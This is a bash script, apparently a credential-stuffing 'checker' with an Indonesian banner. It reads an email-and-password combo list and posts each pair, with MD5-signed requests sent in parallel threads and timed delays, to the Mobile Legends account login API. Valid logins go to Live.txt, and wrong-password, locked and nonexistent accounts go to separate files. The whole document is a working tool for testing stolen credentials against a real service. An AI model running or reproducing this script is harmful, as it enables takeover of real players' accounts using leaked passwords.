#!/bin/bash
# HunterNblz
echo -e "\e[1;32m"
cat << "EOF"

          _____       _____      _    _      _______ 
         / ____|     / ____|    | |  | |    |__   __|
        | (___      | |         | |__| |       | |   
         \___ \     | |         |  __  |       | |   
         ____) |    | |____     | |  | |       | |   
        |_____/      \_____|    |_|  |_|       |_|   
       \==========================================/  
        \      !!! ALON ALON ASAL KELAKON !!!    /
         \======================================/
          | RECODE BOLEH YANG PENTING JANGAN DI| 
          | JUAL BELIKAN ANJING :( !!!         |
          ======================================
    [T] [U] [Y] [U] [L]  [M] [O] [O] [N] [T] [O] [N]
 =======================================================

EOF

function check(){
	local CY='\e[36m'
	local GR='\e[34m'
	local OG='\e[92m'
	local WH='\e[37m'
	local RD='\e[31m'
	local YL='\e[33m'
	local BF='\e[34m'
	local DF='\e[39m'
	local OR='\e[33m'
	local PP='\e[35m'
	local B='\e[1m'
	local CC='\e[0m'
	local md5pwd=$(echo -n ${2} | md5sum | awk '{ print $1 }')
	local sign=$(echo -n "account="${1}"&md5pwd="${md5pwd}"&op=login" | md5sum | awk '{ print $1 }')
	local postdata="{\"op\":\"login\",\"sign\":\"${sign}\",\"params\":{\"account\":\"${1}\",\"md5pwd\":\"${md5pwd}\"},\"lang\":\"en\"}"
	local result=$(curl -s "https://accountmtapi.mobilelegends.com" \
	-A "Mozilla/5.0 (Linux; Android 10; RMX1971) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36" \
	-H "X-Requested-With: com.mobile.legends" \
	-d "${postdata}")
	local TIME=$(date +"%T");
	local STATUS=$(echo $result | grep -Po "(?<=message\":\")[^\"]*")
	local SESSION=$(echo $result | grep -Po "(?<=session\":\")[^\"]*")
	local CODE=$(echo $result | grep -Po "(?<=code\":)[^,]*")
	if [[ $STATUS =~ "Error_Success" ]]; then
		printf "| ${OG}${B}LIVE${CC} | ${1}:${2} => [${PP}${TIME}]\n"
		echo "${1}|${2}" >> Live.txt
	elif [[ $STATUS =~ "Error_PasswdError" ]]; then
		printf "| ${BL}${B}PWSALAH${CC} | ${1}:${2} => [${PP}${TIME}]\n"
		echo "${1}|${2}" >> pwsalah.txt
	elif [[ $STATUS =~ "Error_PwdErrorTooMany" ]]; then
		printf "| ${YL}${B}TerlaluSering${CC} | ${1}:${2} => [${PP}${TIME}]\n"
		echo "${1}|${2}" >> TerlaluSering.txt
	elif [[ $STATUS =~ "Error_NoAccount" ]]; then
	printf "| ${RD}${B}DIE${CC} | ${1}:${2} => [${TIME}]\n"
	else
		printf "| ${CY}${B}UNKNOWN${CC} | ${1}:${2} => [${PP}${TIME}]\n"
	fi
}
echo -e "\e[1;0;200m"
read -p "List Empas [+]: " listempas
read -p "Delimiter [+]: " delim
read -p "Thread [+]: " persend
read -p "Delay [+]: " setleep
printf "\n"

IFS=$'\r\n' GLOBIGNORE='*' command eval 'empas=($(cat $listempas))'
count=1

for (( i = 0; i < ${#empas[@]}; i++ )); do
	username="${empas[$i]}"
	IFS=$delim read -r -a array <<< "$username"
	email=${array[0]}
	password=${array[1]}
	sett=$(expr $count % $persend)

    if [[ $sett == 0 && $count > 0 ]]; then
    	wait
    	printf "=== Sleep for ${setleep}s ===\n"
        sleep $setleep
    fi

    check "${email}" "${password}" &
	count=$[$count+1]
done
wait
